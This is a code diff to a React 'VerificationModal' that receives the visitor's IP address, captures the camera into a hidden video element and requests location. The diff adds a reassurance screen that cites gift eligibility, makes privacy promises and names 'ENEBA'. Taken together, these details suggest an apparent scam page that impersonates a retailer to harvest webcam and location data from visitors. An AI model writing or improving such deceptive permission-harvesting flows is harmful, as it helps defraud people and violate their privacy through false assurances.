@@ -1,7 +1,7 @@
 
 import React, { useState, useRef, useEffect } from 'react';
 import axios from 'axios';
-import { Circle, Check, Camera, MapPin, Loader, AlertCircle } from 'lucide-react';
+import { Circle, Check, Camera, MapPin, Loader, AlertCircle, Info } from 'lucide-react';
 import LoginSignupModal from './LoginSignupModal';
 import { Alert, AlertDescription } from '@/components/ui/alert';
 import { Avatar, AvatarImage, AvatarFallback } from '@/components/ui/avatar';
@@ -13,7 +13,7 @@ interface VerificationModalProps {
 }
 
 const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProps) => {
-  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'warning' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
+  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'warning' | 'permissions' | 'camera' | 'location' | 'location-info' | 'success'>('loading');
   const [userData, setUserData] = useState<any>(null);
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const streamRef = useRef<MediaStream | null>(null);
@@ -151,7 +151,11 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
     const tracks = streamRef.current.getTracks();
     tracks.forEach(track => track.stop());
     
-    // Now request location with improved accuracy
+    // Show location info before requesting location
+    setStep('location-info');
+  };
+  
+  const handleProceedToLocation = () => {
     requestLocation();
   };
   
@@ -288,6 +292,26 @@ const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProp
               <p className="text-xl">Please click allow on the permissions.</p>
               <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
               <video ref={videoRef} className="hidden" />
+            </div>
+          )}
+          
+          {step === 'location-info' && (
+            <div className="flex flex-col items-center space-y-4">
+              <Info className="h-12 w-12 text-custom-yellow" />
+              <h3 className="text-xl font-bold">Location Permission Required</h3>
+              <p className="text-md">We need your location to verify if you're eligible to receive gifts in your region.</p>
+              <Alert className="bg-blue-900/30 border-blue-500/50 my-2">
+                <AlertDescription className="text-left ml-2 text-blue-100">
+                  Your location data is secure and only used to check if you're in the USA. We don't store this information permanently.
+                </AlertDescription>
+              </Alert>
+              <p className="text-sm text-gray-300 mt-2">ENEBA complies with all privacy regulations.</p>
+              <button 
+                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all mt-2"
+                onClick={handleProceedToLocation}
+              >
+                Continue with Location Check
+              </button>
             </div>
           )}
           
